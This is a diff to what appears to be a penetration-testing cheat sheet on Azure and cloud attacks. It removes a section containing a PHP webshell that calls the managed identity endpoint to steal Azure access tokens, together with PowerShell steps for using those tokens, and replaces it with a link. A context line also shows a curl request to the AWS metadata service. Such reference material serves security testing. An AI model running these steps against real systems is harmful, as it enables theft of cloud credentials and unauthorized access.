@@ -140,28 +140,8 @@ curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-toke
 ```
 - if the app service contains environment variables `IDENITY_HEADER` and `IDENTITY_ENDPOINT`, it has a managed identity.
 
-#### Get access token
-- Get access token from managed identity using another webshell.
-```
-<?php
-  system ('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
-  system ('curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
-?>
-```
-
-#### Use access tokens to connect with AZ Module
-- Account ID can be found in `Client_ID` value from requesting the tokens.
-```
-$mgmtToken = <TOKEN>
-$graphToken = <TOKEN>
-Connect-AzAccount -AccessToken $mgmtToken -GraphAccessToken $graphToken -AccountId <ID>
-```
-
-#### Use the AZ module to exploit the permissions this managed identity may have!
-- Example: Check for resources it can access
-```
-Get-AzResource
-```
+#### Exploit
+- Go to [Exploitation Managed Identity](/azure/exploitation.md#Managed-Identity)
 
 ### Server Side Template Injection
 - SSTI allows an attacker to abuse template syntax to inject payloads in a template that is executed on the server side. 
